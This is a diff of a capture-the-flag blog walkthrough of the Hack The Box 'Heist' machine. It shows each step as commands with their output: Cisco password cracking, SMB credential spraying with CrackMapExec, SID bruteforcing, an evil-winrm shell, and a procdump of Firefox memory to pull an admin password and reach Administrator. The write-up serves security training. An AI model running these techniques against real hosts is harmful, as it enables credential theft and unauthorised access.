@@ -102,16 +102,15 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 ===============================================================
 {% endhighlight %}
 
-
 ### 2. Getting User
 
 On the port 80, we can find a login console.<br>
 We don't have any credential yet but we can login as a guest.'
-![placeholder](https://inar1.github.io/public/images/2019-12-01/heist-badge.png)
+![placeholder](https://inar1.github.io/public/images/2019-12-01/2019-12-02-01-30-10.png)
 
 Then, we can see the following messages.<br>
 One of the post has an attachment that is a config file of cisco router.
-![placeholder](https://inar1.github.io/public/images/2019-12-01/heist-badge.png)
+![placeholder](https://inar1.github.io/public/images/2019-12-01/2019-12-02-01-30-34.png)
 {% highlight shell %}
 root@kali:~# curl http://10.10.10.149/attachments/config.txt
 version 12.2
@@ -195,9 +194,9 @@ We can use <a href="https://passwordrecovery.io/cisco/">this website</a> for tha
 {% highlight shell %}
 $uperP@ssword
 Q4)sJu\Y8qz*A3?d
-*{% endhighlight %}
-![placeholder](https://inar1.github.io/public/images/2019-12-01/heist-badge.png)
-![placeholder](https://inar1.github.io/public/images/2019-12-01/heist-badge.png)
+{% endhighlight %}
+![placeholder](https://inar1.github.io/public/images/2019-12-01/2019-11-30-20-34-25.png)
+![placeholder](https://inar1.github.io/public/images/2019-12-01/2019-11-30-20-37-01.png)
 
 Now we have the following users from "issues.php" and passwords from "/attachment/config.txt".<br>
 Then, try each pattern for SMB login with <a href="https://github.com/byt3bl33d3r/CrackMapExec.git">CrackMapExec</a>.
@@ -264,7 +263,7 @@ root@kali:~# smbmap -H 10.10.10.149 -u hazard -p stealth1agent
 	IPC$                                              	READ ONLY
 
 root@kali:~#
-*{% endhighlight %}
+{% endhighlight %}
 
 Next, try to enumerate via on MSRPC port 5985<br>
 With a script in the package "<a href="https://github.com/SecureAuthCorp/impacket">Impacket</a>", we can bruteforce the SID of Windows host.
@@ -286,7 +285,7 @@ Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
 1013: SUPPORTDESK\Jason (SidTypeUser)
 
 root@kali:~# 
-*{% endhighlight %}
+{% endhighlight %}
 
 Now we found additional users.<br>
 Then try to bruteforce the SMB again.
@@ -334,12 +333,12 @@ CME          10.10.10.149:445 SUPPORTDESK     [+] SUPPORTDESK\chase:Q4)sJu\Y8qz*
 [*] KTHXBYE!
 
 root@kali:~#
-*{% endhighlight %}
+{% endhighlight %}
 
 Now we found additional credential.
 {% highlight shell %}
 chase:Q4)sJu\Y8qz*A3?d
-*{% endhighlight %}
+{% endhighlight %}
 
 Still we can not use Psexec, but this time we can login via WinRM.<br>
 This time, "<a href="https://github.com/Hackplayers/evil-winrm">evil-winrm"</a>" was used for the user shell as "Chase".
@@ -366,7 +365,7 @@ Info: Establishing connection to remote endpoint
 supportdesk\chase
 
 *Evil-WinRM* PS C:\Users\Chase\Documents>
-*{% endhighlight %}
+{% endhighlight %}
 
 user.txt is in a directory "C:\Users\Chase\Desktop"
 {% highlight shell %}
@@ -517,18 +516,109 @@ Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
 
 We can find out even though this is server, Firefox is running.
 {% highlight shell %}
-*Evil-WinRM* PS C:\Users\Chase\Documents> get-process -name firefox
+*Evil-WinRM* PS C:\Users\Chase\Desktop> get-process -name firefox
 
 Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                                                                                                                                                    
 -------  ------    -----      -----     ------     --  -- -----------                                                                                                                                                                                    
-    343      19    10164      37648       0.56   1088   1 firefox                                                                                                                                                                                        
-    390      34    63644      95964      85.36   1716   1 firefox                                                                                                                                                                                        
-    358      26    16292      37592       1.00   4296   1 firefox                                                                                                                                                                                        
-    408      31    17404      63240       3.84   4704   1 firefox                                                                                                                                                                                        
-   1145      72   148184     484392      44.81   4968   1 firefox                                                                                                                                                                                        
+   1149      74   151660     190244      43.80   4908   1 firefox                                                                                                                                                                                        
+    341      19     9952      37304       0.69   6024   1 firefox                                                                                                                                                                                        
+    408      31    17036      62692       2.70   6256   1 firefox                                                                                                                                                                                        
+    390      34    59020      90736     117.78   6564   1 firefox                                                                                                                                                                                        
+    358      26    16360      37556       0.66   6728   1 firefox                                                                                                                                                                                        
 
 
-*Evil-WinRM* PS C:\Users\Chase\Documents> 
+*Evil-WinRM* PS C:\Users\Chase\Desktop> 
 {% endhighlight %}
 
-To obtain information from the process, we can use a tool <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump">Procdump</a>
+To obtain information from the process, we can use a tool <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump">Procdump</a>.<br>
+Download it and extract, then upload the "procdump.exe" binary with a command "upload".
+{% highlight shell %}
+*Evil-WinRM* PS C:\Users\Chase\Documents> upload procdump.exe
+Info: Uploading procdump.exe to C:\Users\Chase\Documents\procdump.exe
+
+Data: 868564 bytes of 868564 bytes copied
+
+Info: Upload successful!
+
+*Evil-WinRM* PS C:\Users\Chase\Documents>
+{% endhighlight %}
+
+Then, execute the "procdump.exe".<br>
+It generates a process file "C:\Users\Chase\Desktop\firefox.exe_191202_022858.dmp"
+{% highlight shell %}
+*Evil-WinRM* PS C:\Users\Chase\Desktop> ./procdump.exe -ma 6728 -accepteula
+
+ProcDump v9.0 - Sysinternals process dump utility
+Copyright (C) 2009-2017 Mark Russinovich and Andrew Richards
+Sysinternals - www.sysinternals.com
+
+[02:28:58] Dump 1 initiated: C:\Users\Chase\Desktop\firefox.exe_191202_022858.dmp
+[02:28:58] Dump 1 writing: Estimated dump file size is 280 MB.
+[02:29:02] Dump 1 complete: 281 MB written in 3.4 seconds
+[02:29:02] Dump count reached.
+
+*Evil-WinRM* PS C:\Users\Chase\Desktop> 
+{% endhighlight %}
+
+Download the file to the localhost. "Evil-WinRM" has a command for that purpose.
+{% highlight shell %}
+*Evil-WinRM* PS C:\Users\Chase\Desktop> download firefox.exe_191202_022858.dmp
+Info: Downloading C:\Users\Chase\Desktop\firefox.exe_191202_022858.dmp to firefox.exe_191202_022858.dmp
+
+Info: Download successful!
+
+*Evil-WinRM* PS C:\Users\Chase\Desktop>
+{% endhighlight %}
+
+
+Try to analyze the process file.<br>
+To look for a word "password" in the process and we can find an URL parameter "password".
+{% highlight shell %}
+*Evil-WinRM* PS C:\Users\Chase\Documents> cat firefox.exe_191202_042810.dmp | Select-String "password"
+
+---
+
+Firefox\firefox.exeMOZ‘27�ÄGáõþGáõþRG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=MOZ_CRASHREPORTER_STRINGS_OVERRIDE=C:\Program Files\Mozilla Firefox\browser\crashreporter-override.iniNU
+
+---
+
+{% endhighlight %}
+
+Now we found the following credential.
+{% highlight shell %}
+admin:4dD!5}x/re8]FBuZ
+{% endhighlight %}
+
+Then, try to login with the following way.<br>
+We can achieve administrator shell.
+{% highlight shell %}
+root@kali:~# evil-winrm -u Administrator -p '4dD!5}x/re8]FBuZ' -i 10.10.10.149
+
+Evil-WinRM shell v2.0
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+supportdesk\administrator
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents>
+{% endhighlight %}
+
+As always. root.txt is in the directory "C:\Users\Administrator\Desktop".
+{% highlight shell %}
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                LastWriteTime         Length Name                                                                                                                                                                                                    
+----                -------------         ------ ----                                                                                                                                                                                                    
+-a----        4/22/2019   9:05 AM             32 root.txt                                                                                                                                                                                                
+
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
+50dfa3c6bfd20e2e0d071b073d766897
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> 
+{% endhighlight %}
